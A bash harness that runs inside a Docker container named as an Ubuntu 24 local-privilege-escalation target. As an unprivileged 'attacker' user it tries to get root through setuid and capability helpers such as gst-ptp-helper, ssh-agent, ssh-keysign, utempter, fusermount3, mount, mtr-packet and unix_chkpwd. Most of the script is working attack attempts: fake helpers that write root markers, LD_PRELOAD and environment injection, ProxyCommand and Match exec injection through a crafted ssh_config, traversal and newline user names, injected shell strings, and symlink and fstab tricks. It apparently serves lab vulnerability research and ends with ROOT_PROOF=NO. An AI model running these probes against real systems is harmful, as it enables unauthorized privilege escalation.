#!/usr/bin/env bash
set -u -o pipefail

target="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$target" bash -s <<'INNER'
set +e
export LC_ALL=C

section() {
  printf '\n===== %s =====\n' "$*"
}

run() {
  printf '+ %s\n' "$*"
  bash -lc "$*" 2>&1
  printf 'rc=%s\n' "$?"
}

as_attacker() {
  printf '+ runuser -u attacker -- %s\n' "$*"
  runuser -u attacker -- bash -lc "$*" 2>&1
  printf 'rc=%s\n' "$?"
}

arch="$(dpkg-architecture -qDEB_HOST_MULTIARCH 2>/dev/null || true)"
[ -n "$arch" ] || arch="$(ls -d /usr/lib/*-linux-gnu 2>/dev/null | head -1 | xargs -r basename)"
[ -n "$arch" ] || arch="aarch64-linux-gnu"
GST="/usr/lib/$arch/gstreamer1.0/gstreamer-1.0/gst-ptp-helper"
UTEMPTER="/usr/lib/$arch/utempter/utempter"
WORK="/tmp/setuid-cap-tail-20260517"
AHOME="/home/attacker/setuid-cap-tail-20260517"
ROOT_MARKER="/root/setuid-cap-tail-20260517-root"
ROOT_BASE="/tmp/setuid-cap-tail-20260517-root"
export arch GST UTEMPTER WORK AHOME ROOT_MARKER ROOT_BASE

cleanup() {
  fusermount3 -u "$WORK/fuse-mnt" >/dev/null 2>&1 || umount "$WORK/fuse-mnt" >/dev/null 2>&1 || true
  fusermount3 -u "$WORK/fuse-link" >/dev/null 2>&1 || umount "$WORK/fuse-link" >/dev/null 2>&1 || true
  pkill -u attacker -f 'setuid-cap-tail-20260517' >/dev/null 2>&1 || true
  if [ -e "$ROOT_BASE/run.utmp.bak" ]; then cp -a "$ROOT_BASE/run.utmp.bak" /run/utmp 2>/dev/null || true; fi
  if [ -e "$ROOT_BASE/wtmp.bak" ]; then cp -a "$ROOT_BASE/wtmp.bak" /var/log/wtmp 2>/dev/null || true; fi
  rm -rf "$WORK" "$AHOME" "$ROOT_BASE"
  rm -f /tmp/setuid-cap-tail-20260517.* /root/setuid-cap-tail-20260517-fake-helper
}

trap cleanup EXIT
cleanup
mkdir -p "$ROOT_BASE"
cp -a /run/utmp "$ROOT_BASE/run.utmp.bak" 2>/dev/null || true
cp -a /var/log/wtmp "$ROOT_BASE/wtmp.bak" 2>/dev/null || true

section "target, default package, and helper metadata proof"
run 'docker_marker=inside-container; echo "$docker_marker"; cat /etc/os-release | sed -n "1,10p"; uname -a; id attacker; groups attacker'
run 'dpkg-query -W -f='\''${binary:Package}\t${Version}\t${Architecture}\t${db:Status-Abbrev}\t${source:Package}\t${source:Version}\n'\'' ubuntu-minimal ubuntu-standard ubuntu-server libgstreamer1.0-0 openssh-client libutempter0 fuse3 mount util-linux passwd login libpam-modules libpam-modules-bin dbus dbus-daemon dbus-system-bus-common polkitd iputils-ping mtr-tiny 2>&1'
run 'apt-mark showmanual | sort | grep -Ex "ubuntu-(minimal|standard|server)|openssh-client|fuse3|mtr-tiny|iputils-ping|dbus|polkitd|libutempter0|libgstreamer1.0-0|util-linux|mount|passwd|login|libpam-modules(-bin)?" || true'
run 'apt-get -s full-upgrade 2>&1 | sed -n "1,80p"'
run 'for p in libgstreamer1.0-0 openssh-client libutempter0 fuse3 mount util-linux passwd login libpam-modules libpam-modules-bin dbus dbus-daemon dbus-system-bus-common polkitd iputils-ping mtr-tiny; do printf "PKG_VERIFY %s " "$p"; dpkg -V "$p" >/tmp/dpkgv.$$ 2>&1; rc=$?; printf "rc=%s\n" "$rc"; sed "s/^/  /" /tmp/dpkgv.$$; rm -f /tmp/dpkgv.$$; done'
run "printf 'GST=%s\nUTEMPTER=%s\nARCH=%s\n' '$GST' '$UTEMPTER' '$arch'"
run "dpkg -S '$GST' '$UTEMPTER' /usr/bin/ssh-agent /usr/lib/openssh/ssh-keysign /usr/bin/fusermount3 /usr/bin/mount /usr/bin/umount /usr/bin/ping /usr/bin/mtr-packet /usr/sbin/unix_chkpwd /usr/sbin/pam_extrausers_chkpwd /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/polkit-1/polkit-agent-helper-1 2>&1"
run "stat -c '%A %a %U:%G %u:%g %s %n' '$GST' '$UTEMPTER' /usr/bin/ssh-agent /usr/lib/openssh/ssh-keysign /usr/bin/fusermount3 /usr/bin/mount /usr/bin/umount /usr/bin/ping /usr/bin/mtr-packet /usr/sbin/unix_chkpwd /usr/sbin/pam_extrausers_chkpwd /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/polkit-1/polkit-agent-helper-1 2>&1"
run "getcap -v '$GST' '$UTEMPTER' /usr/bin/ssh-agent /usr/lib/openssh/ssh-keysign /usr/bin/fusermount3 /usr/bin/mount /usr/bin/umount /usr/bin/ping /usr/bin/mtr-packet /usr/sbin/unix_chkpwd /usr/sbin/pam_extrausers_chkpwd /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/polkit-1/polkit-agent-helper-1 2>&1"
run 'find / -xdev \( -perm -4000 -o -perm -2000 -o -type f -exec getcap {} + \) -printf "%m %u:%g %p\n" 2>/dev/null | sort | sed -n "1,220p"'
run 'find / -xdev \( -group _ssh -o -group utmp -o -group shadow -o -group messagebus \) -printf "%m %u:%g %p\n" 2>/dev/null | sort'

section "attacker baseline and sensitive-state hashes"
as_attacker 'id; grep -E "^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):" /proc/self/status; for f in /etc/shadow /etc/gshadow /run/utmp /var/log/wtmp /var/log/btmp; do test -r "$f"; echo readable_rc:$f:$?; test -w "$f"; echo writable_rc:$f:$?; done'
run 'sha256sum /etc/passwd /etc/shadow /etc/group /etc/gshadow /run/utmp /var/log/wtmp /var/log/btmp 2>/dev/null | tee /tmp/setuid-cap-tail-20260517.before.sha256'
run 'sysctl fs.protected_symlinks fs.protected_hardlinks fs.protected_regular fs.protected_fifos kernel.unprivileged_userns_clone 2>&1'

section "gst-ptp-helper file-capability tail checks"
as_attacker "mkdir -p '$AHOME/gst' '$AHOME/bin'; printf '#!/bin/sh\nid > $ROOT_MARKER\nid > /tmp/setuid-cap-tail-20260517.gst-fake-helper\n' > '$AHOME/bin/gst-ptp-helper'; chmod 755 '$AHOME/bin/gst-ptp-helper'"
as_attacker "env -i PATH='$AHOME/bin:/usr/bin:/bin' HOME='$AHOME' LD_PRELOAD='$AHOME/nope.so' GST_PTP_HELPER='$AHOME/bin/gst-ptp-helper' GST_PLUGIN_PATH='$AHOME/plugins' GST_DEBUG_FILE='$AHOME/gst/debug.log' '$GST' -i eth0 --clock-id 0x0102030405060708 </dev/null > /tmp/setuid-cap-tail-20260517.gst.stdout 2> /tmp/setuid-cap-tail-20260517.gst.stderr; echo gst_direct_rc=\$?; xxd -p /tmp/setuid-cap-tail-20260517.gst.stdout 2>/dev/null || true; tail -c 500 /tmp/setuid-cap-tail-20260517.gst.stderr | tr '\000' '?'"
as_attacker 'python3 - <<'"'"'PY'"'"'
import os, select, struct, subprocess, time
helper = os.environ["GST"]
p = subprocess.Popen([helper, "-i", "eth0", "--clock-id", "0x0102030405060708"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
clock = p.stdout.read(11)
print("gst_pid", p.pid)
print("clock_len", len(clock), "clock_hex", clock.hex())
time.sleep(0.25)
with open(f"/proc/{p.pid}/status", "r", encoding="utf-8") as f:
    for line in f:
        if line.startswith(("Uid:", "Gid:", "Groups:", "CapInh:", "CapPrm:", "CapEff:", "CapBnd:", "CapAmb:", "NoNewPrivs:", "Seccomp:")):
            print(line.strip())
subprocess.run(["getpcaps", str(p.pid)], check=False)
ptp = bytearray(44)
ptp[0] = 1
ptp[1] = 2
ptp[2:4] = (44).to_bytes(2, "big")
ptp[20:28] = bytes.fromhex("0102030405060708")
ptp[28:30] = (1).to_bytes(2, "big")
ptp[30:32] = (0x517).to_bytes(2, "big")
ptp[32] = 1
body = bytes([0]) + (0).to_bytes(8, "big") + ptp
p.stdin.write(struct.pack(">HB", len(body), 0) + body)
p.stdin.flush()
ready, _, _ = select.select([p.stdout], [], [], 2)
ack = os.read(p.stdout.fileno(), 64) if ready else b""
print("ack_len", len(ack), "ack_hex", ack.hex())
p.stdin.close()
try:
    p.wait(timeout=2)
except subprocess.TimeoutExpired:
    p.kill(); p.wait()
print("gst_valid_rc", p.returncode)
print("gst_stderr_tail", p.stderr.read().decode("utf-8", "replace")[-400:].replace("\0", "?").replace("\n", "\\n"))
PY'
as_attacker 'test -e /tmp/setuid-cap-tail-20260517.gst-fake-helper; echo gst_fake_helper_marker_rc=$?; test -e /root/setuid-cap-tail-20260517-root; echo gst_root_marker_rc=$?; find "$HOME/setuid-cap-tail-20260517/gst" -maxdepth 2 -type f -printf "%m %u:%g %p\n" 2>/dev/null || true'

section "ssh-agent setgid _ssh tail checks"
as_attacker "mkdir -p '$AHOME/agent/bin' '$AHOME/agent/dir'; cat > '$AHOME/agent/bin/pkcs11-helper' <<'EOF'
#!/bin/sh
{
  id
  grep -E '^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)):' /proc/self/status
  printf 'argv:'
  for a in \"\$@\"; do printf ' <%s>' \"\$a\"; done
  printf '\n'
} > /tmp/setuid-cap-tail-20260517.pkcs11-helper
id > '$ROOT_MARKER'
exit 1
EOF
chmod 755 '$AHOME/agent/bin/pkcs11-helper'"
as_attacker "SSH_PKCS11_HELPER='$AHOME/agent/bin/pkcs11-helper' timeout 10 /usr/bin/ssh-agent -a '$AHOME/agent/dir/sock' sh -c 'echo agent_command_id; id; grep -E \"^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)):\" /proc/self/status; stat -c \"%A %a %U:%G %n\" \"\$SSH_AUTH_SOCK\" \"\$(dirname \"\$SSH_AUTH_SOCK\")\"; ssh-add -s /usr/lib/$arch/libc.so.6 </dev/null >/tmp/setuid-cap-tail-20260517.sshadd.out 2>/tmp/setuid-cap-tail-20260517.sshadd.err; echo ssh_add_rc=\$?; cat /tmp/setuid-cap-tail-20260517.sshadd.err'; echo ssh_agent_command_rc=\$?; cat /tmp/setuid-cap-tail-20260517.pkcs11-helper 2>/dev/null || echo no_pkcs11_marker"
as_attacker "ln -s /root/setuid-cap-tail-20260517-agent-sock '$AHOME/agent/link.sock'; /usr/bin/ssh-agent -D -a '$AHOME/agent/link.sock' >/tmp/setuid-cap-tail-20260517.agent-link.out 2>/tmp/setuid-cap-tail-20260517.agent-link.err & pid=\$!; sleep 0.5; echo agent_link_pid=\$pid; grep -E '^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)):' /proc/\$pid/status 2>&1 || true; getpcaps \$pid 2>&1 || true; kill \$pid 2>/dev/null; wait \$pid 2>/dev/null; echo agent_link_wait_rc=\$?; cat /tmp/setuid-cap-tail-20260517.agent-link.err; test -e /root/setuid-cap-tail-20260517-agent-sock; echo root_agent_sock_rc=\$?"
run 'test -e /root/setuid-cap-tail-20260517-root; echo ssh_agent_root_marker_rc=$?'

section "utempter setgid utmp environment, PTY, and accounting bounds"
as_attacker 'python3 - <<'"'"'PY'"'"'
import ctypes, os, pty, subprocess, sys, time
home = "/home/attacker/setuid-cap-tail-20260517/utempter"
os.makedirs(home, exist_ok=True)
os.environ["UTMP_FILE"] = home + "/attacker.utmp"
os.environ["WTMP_FILE"] = home + "/attacker.wtmp"
os.environ["LD_PRELOAD"] = home + "/nope.so"
master, slave = pty.openpty()
slave_name = os.ttyname(slave)
print("pty_slave", slave_name)
print("slave_stat", subprocess.check_output(["stat", "-c", "%A %U:%G %n", slave_name], text=True).strip())
lib = ctypes.CDLL("libutempter.so.0")
lib.utempter_add_record.argtypes = [ctypes.c_int, ctypes.c_char_p]
lib.utempter_remove_record.argtypes = [ctypes.c_int]
for host in [b"tail-host", b"../root/escape", b"bad\nhost"]:
    rc = lib.utempter_add_record(master, host)
    print("add_record", repr(host), "rc", rc)
    time.sleep(0.1)
    rem = lib.utempter_remove_record(master)
    print("remove_record", repr(host), "rc", rem)
os.close(master)
os.close(slave)
for path in [home + "/attacker.utmp", home + "/attacker.wtmp", "/root/setuid-cap-tail-20260517-root"]:
    print("path_exists", path, os.path.exists(path))
PY
who | grep setuid-cap-tail || true
find "$HOME/setuid-cap-tail-20260517/utempter" -maxdepth 1 -type f -printf "%m %u:%g %s %p\n" 2>/dev/null || true'
as_attacker "printf 'x\n' | env UTMP_FILE='$AHOME/utempter/utmp.env' WTMP_FILE='$AHOME/utempter/wtmp.env' LD_PRELOAD='$AHOME/utempter/nope.so' '$UTEMPTER' add bad-host 2>&1; echo direct_utempter_rc=\$?; find '$AHOME/utempter' -maxdepth 1 -type f -printf '%m %u:%g %s %p\n' 2>/dev/null || true"
run 'sha256sum /run/utmp /var/log/wtmp 2>/dev/null; cp -a "$ROOT_BASE/run.utmp.bak" /run/utmp 2>/dev/null || true; cp -a "$ROOT_BASE/wtmp.bak" /var/log/wtmp 2>/dev/null || true; sha256sum /run/utmp /var/log/wtmp 2>/dev/null'

section "ssh-keysign setuid root disabled-global-config checks"
as_attacker "mkdir -p '$AHOME/keysign/.ssh' '$AHOME/keysign/bin'; cat > '$AHOME/keysign/ssh_config' <<'EOF'
Host *
    EnableSSHKeysign yes
    HostbasedAuthentication yes
    ProxyCommand sh -c 'id > /tmp/setuid-cap-tail-20260517.proxy-id; exit 1'
    Match exec \"id > /tmp/setuid-cap-tail-20260517.match-id\"
EOF
HOME='$AHOME/keysign' PATH='$AHOME/keysign/bin:/usr/bin:/bin' LD_PRELOAD='$AHOME/keysign/nope.so' /usr/lib/openssh/ssh-keysign </dev/null > /tmp/setuid-cap-tail-20260517.keysign.out 2> /tmp/setuid-cap-tail-20260517.keysign.err; echo direct_keysign_rc=\$?; cat /tmp/setuid-cap-tail-20260517.keysign.out /tmp/setuid-cap-tail-20260517.keysign.err"
as_attacker "HOME='$AHOME/keysign' ssh -F '$AHOME/keysign/ssh_config' -oBatchMode=yes -oConnectTimeout=1 127.0.0.1 true >/tmp/setuid-cap-tail-20260517.ssh.out 2>/tmp/setuid-cap-tail-20260517.ssh.err; echo ssh_client_rc=\$?; cat /tmp/setuid-cap-tail-20260517.match-id /tmp/setuid-cap-tail-20260517.proxy-id 2>/dev/null || true; tail -n 20 /tmp/setuid-cap-tail-20260517.ssh.err"
run 'ls -l /etc/ssh/ssh_host_* 2>&1; grep -RIn "^[[:space:]]*[^#[:space:]]" /etc/ssh 2>/dev/null || true; test -e /root/setuid-cap-tail-20260517-root; echo keysign_root_marker_rc=$?'

section "fusermount3, mount, and umount semantic tail checks"
run 'ls -l /dev/fuse /etc/fuse.conf /etc/mtab /run/mount /run/mount/utab /run/mount/utab.lock 2>&1; findmnt -no TARGET,FSTYPE,OPTIONS /run/mount 2>&1 || true; grep -n "^[^#]" /etc/fuse.conf 2>/dev/null || true'
as_attacker 'python3 - <<'"'"'PY'"'"'
import array, os, socket, subprocess, time
base="/tmp/setuid-cap-tail-20260517/fuse"
mnt="/tmp/setuid-cap-tail-20260517/fuse-mnt"
os.makedirs(base, exist_ok=True)
os.makedirs(mnt, exist_ok=True)
parent, child = socket.socketpair()
env=os.environ.copy()
env["_FUSE_COMMFD"]=str(child.fileno())
env["LD_PRELOAD"]="/home/attacker/setuid-cap-tail-20260517/fuse/nope.so"
cmd=["/usr/bin/fusermount3", "-o", "rw,suid,dev,exec", mnt]
p=subprocess.Popen(cmd, pass_fds=(child.fileno(),), env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
child.close()
parent.settimeout(3)
fds=array.array("i")
got=False
try:
    msg, anc, flags, addr = parent.recvmsg(1, socket.CMSG_LEN(fds.itemsize))
    for level, typ, data in anc:
        if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
            fds.frombytes(data[:fds.itemsize])
            got=True
except Exception as exc:
    print("fuse_recv_exc", type(exc).__name__, str(exc))
out, err = p.communicate(timeout=5)
print("fusermount_rc", p.returncode, "got_fd", got, "fds", list(fds))
print("fusermount_stdout", out.decode("utf-8", "replace").replace("\n", "\\n"))
print("fusermount_stderr", err.decode("utf-8", "replace").replace("\n", "\\n"))
if got:
    os.close(fds[0])
subprocess.run(["findmnt", "-no", "TARGET,FSTYPE,OPTIONS", mnt], check=False)
subprocess.run(["fusermount3", "-u", mnt], check=False)
PY'
as_attacker "mkdir -p '$WORK/mount-src' '$WORK/mount-alt' '$WORK/fuse-root-owned'; ln -s / '$WORK/fuse-link'; /usr/bin/fusermount3 -u '$WORK/fuse-link' 2>&1; echo fuse_unmount_symlink_rc=\$?; /usr/bin/fusermount3 -o allow_other '$WORK/fuse-root-owned' 2>&1; echo fuse_allow_other_rc=\$?"
as_attacker "cat > '$AHOME/attacker.fstab' <<EOF
none $WORK/mount-alt/leaf tmpfs user,exec,suid,dev,x-mount.mkdir 0 0
$WORK/mount-src $WORK/mount-alt/bind none user,bind,x-mount.mkdir 0 0
EOF
/usr/bin/mount -T '$AHOME/attacker.fstab' '$WORK/mount-alt/leaf' 2>&1; echo mount_attacker_fstab_rc=\$?; stat -c '%A %U:%G %n' '$WORK/mount-alt' '$WORK/mount-alt/leaf' 2>&1; /usr/bin/mount --mkdir '$WORK/mount-src' '/root/setuid-cap-tail-20260517-mount/leaf' 2>&1; echo mount_root_mkdir_rc=\$?; test -e /root/setuid-cap-tail-20260517-mount; echo root_mount_dir_rc=\$?"
as_attacker "/usr/bin/mount -N /proc/1/ns/mnt -t tmpfs tmpfs '$WORK/mount-alt/ns' 2>&1; echo mount_namespace_rc=\$?; /usr/bin/umount -N /proc/1/ns/mnt '$WORK/fuse-link' 2>&1; echo umount_namespace_symlink_rc=\$?; /usr/bin/umount '$WORK/fuse-link' 2>&1; echo umount_symlink_rc=\$?"
run 'ls -l /run/mount/utab /run/mount/utab.lock 2>&1; find /root -maxdepth 1 -name "setuid-cap-tail-20260517*" -printf "%m %u:%g %p\n" 2>/dev/null || true'

section "ping and mtr-packet cap_net_raw tail checks"
as_attacker 'ping -V 2>&1; ping -c1 -W1 127.0.0.1 2>&1 | sed -n "1,20p"; ping -m 123 -c1 -W1 127.0.0.1 2>&1 | sed -n "1,30p"'
as_attacker 'ping -i 1 -c 4 127.0.0.1 >/tmp/setuid-cap-tail-20260517.ping.out 2>/tmp/setuid-cap-tail-20260517.ping.err & pid=$!; sleep 0.3; echo ping_pid=$pid; grep -E "^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs):" /proc/$pid/status 2>&1 || true; getpcaps $pid 2>&1 || true; wait $pid; echo ping_wait_rc=$?; cat /tmp/setuid-cap-tail-20260517.ping.err'
as_attacker 'mkfifo /tmp/setuid-cap-tail-20260517.mtr.in; /usr/bin/mtr-packet </tmp/setuid-cap-tail-20260517.mtr.in >/tmp/setuid-cap-tail-20260517.mtr.out 2>/tmp/setuid-cap-tail-20260517.mtr.err & pid=$!; exec 9>/tmp/setuid-cap-tail-20260517.mtr.in; sleep 0.3; echo mtr_pid=$pid; grep -E "^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs):" /proc/$pid/status 2>&1 || true; getpcaps $pid 2>&1 || true; printf "1 check-support feature send-probe\n2 check-support feature mark\n3 send-probe ip-4 127.0.0.1 protocol icmp size 64 timeout 1\n4 send-probe ip-4 127.0.0.1 protocol icmp mark 123 timeout 1\n5 send-probe ip-4 ../../etc/shadow protocol icmp timeout 1\n6 /bin/sh -c id\n" >&9; sleep 1; exec 9>&-; wait $pid; echo mtr_wait_rc=$?; cat /tmp/setuid-cap-tail-20260517.mtr.out /tmp/setuid-cap-tail-20260517.mtr.err 2>/dev/null'

section "unix_chkpwd and pam_extrausers_chkpwd setgid shadow tail checks"
run 'ls -ld /var/lib/extrausers 2>&1 || true; ls -l /etc/passwd /etc/shadow /etc/group /etc/gshadow 2>&1'
as_attacker "mkdir -p '$AHOME/extrausers'; for h in /usr/sbin/unix_chkpwd /usr/sbin/pam_extrausers_chkpwd; do for user in attacker root '../etc/shadow' 'attacker
root' missinguser; do printf 'helper=%s user=%q\n' \"\$h\" \"\$user\"; printf 'wrong-password\n' | env EXTRAUSERS_DIR='$AHOME/extrausers' PAM_EXTRAUSERS_DIR='$AHOME/extrausers' GCONV_PATH='$AHOME/gconv' LOCPATH='$AHOME/locale' LD_PRELOAD='$AHOME/nope.so' \"\$h\" \"\$user\" nullok 2>&1; echo helper_rc=\$?; done; done"
run "strace -f -qq -e trace=openat,setgid,setregid,setresgid,setuid,setreuid,setresuid,execve -s 160 -o /tmp/setuid-cap-tail-20260517.chkpwd.strace runuser -u attacker -- bash -lc \"printf 'wrong-password\\\\n' | env EXTRAUSERS_DIR='$AHOME/extrausers' /usr/sbin/unix_chkpwd attacker nullok >/tmp/setuid-cap-tail-20260517.unix.out 2>&1; printf 'wrong-password\\\\n' | env EXTRAUSERS_DIR='$AHOME/extrausers' /usr/sbin/pam_extrausers_chkpwd attacker nullok >/tmp/setuid-cap-tail-20260517.extra.out 2>&1\"; echo strace_rc=\$?; sed -n '1,180p' /tmp/setuid-cap-tail-20260517.chkpwd.strace; echo unix_out; cat /tmp/setuid-cap-tail-20260517.unix.out; echo extra_out; cat /tmp/setuid-cap-tail-20260517.extra.out"
as_attacker "find '$AHOME/extrausers' -maxdepth 2 -printf '%m %u:%g %p\n' 2>/dev/null; test -e /var/lib/extrausers; echo var_lib_extrausers_exists_rc=\$?"

section "dbus and polkit helper current-state gap check"
run 'systemctl is-active dbus.service dbus.socket polkit.service 2>&1 || true; ls -l /run/dbus/system_bus_socket 2>&1; stat -c "%A %a %U:%G %n" /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/polkit-1/polkit-agent-helper-1 2>&1'
as_attacker '/usr/lib/dbus-1.0/dbus-daemon-launch-helper com.ubuntu.SoftwareProperties 2>&1; echo dbus_helper_direct_rc=$?; printf "wrong\n" | /usr/lib/polkit-1/polkit-agent-helper-1 attacker fake-cookie 2>&1; echo polkit_helper_fake_cookie_rc=$?'
as_attacker 'dbus-send --system --print-reply --dest=org.freedesktop.DBus / org.freedesktop.DBus.UpdateActivationEnvironment array:string:"PATH=/home/attacker/setuid-cap-tail-20260517/bin" 2>&1; echo dbus_update_env_rc=$?'

section "post-probe integrity, cleanup, and root proof"
run 'sha256sum /etc/passwd /etc/shadow /etc/group /etc/gshadow /run/utmp /var/log/wtmp /var/log/btmp 2>/dev/null | tee /tmp/setuid-cap-tail-20260517.after.sha256; diff -u /tmp/setuid-cap-tail-20260517.before.sha256 /tmp/setuid-cap-tail-20260517.after.sha256 2>&1 || true'
run 'test -e /root/setuid-cap-tail-20260517-root; echo root_marker_exists_rc=$?; test -e /root/setuid-cap-tail-20260517-agent-sock; echo root_agent_sock_exists_rc=$?; test -e /root/setuid-cap-tail-20260517-mount; echo root_mount_dir_exists_rc=$?'
cleanup
run 'test ! -e /tmp/setuid-cap-tail-20260517; echo tmp_work_removed_rc=$?; test ! -e /home/attacker/setuid-cap-tail-20260517; echo attacker_work_removed_rc=$?; find /tmp -maxdepth 1 -name "setuid-cap-tail-20260517*" -printf "%m %u:%g %p\n" 2>/dev/null || true; find /root -maxdepth 1 -name "setuid-cap-tail-20260517*" -printf "%m %u:%g %p\n" 2>/dev/null || true'
run 'systemctl is-system-running 2>&1 || true; systemctl --failed --no-legend 2>&1 || true; pgrep -a -u attacker "ssh-agent|mtr-packet|gst-ptp-helper" 2>&1 || true'
printf '\nROOT_PROOF=NO\n'
INNER
